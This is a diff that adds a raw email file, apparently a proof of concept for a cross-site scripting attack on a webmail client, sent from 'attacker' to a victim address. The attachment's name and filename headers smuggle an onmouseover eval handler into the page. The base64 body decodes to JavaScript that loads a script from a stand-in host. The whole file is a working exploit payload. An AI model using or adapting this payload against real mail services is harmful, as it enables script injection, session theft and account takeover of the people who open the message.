@@ -1,0 +1,26 @@
+From: <attacker@attacker.com>
+Subject: webmailtest
+To: victim@sogou.com
+MIME-Version: 1.0
+Content-type: multipart/mixed;
+	boundary="----=_Part_192061_1556421578.1563869810627"
+
+------=_Part_192061_1556421578.1563869810627
+Content-Type: multipart/alternative; 
+	boundary="----=_Part_192063_26965953.1563869810627"
+
+------=_Part_192063_26965953.1563869810627
+Content-Type: text/plain; charset=GBK
+Content-Transfer-Encoding: 7bit
+
+testforfile
+
+------=_Part_192063_26965953.1563869810627--
+
+------=_Part_192061_1556421578.1563869810627
+Content-Type: text/html; name="ix" onmouseover=eval(document.getElementsByTagName('x')[0].innerHTML); ix="x.jpg
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="ix" onmouseover=eval(document.getElementsByTagName('x')[0].innerHTML); ix="x.jpg"
+
+Jmx0O3gmZ3Q7ZD1kb2N1bWVudDtlPWQuY3JlYXRlRWxlbWVudCgmIzM5O3NjcmlwdCYjMzk7KTtlLnNyYz0mIzM5O2h0dHA6Ly8xMjcuMC4wLjEvaS5qcyYjMzk7O2QuYm9keS5hcHBlbmRDaGlsZChlKTsmbHQ7L3gmZ3Q7
+------=_Part_192061_1556421578.1563869810627--
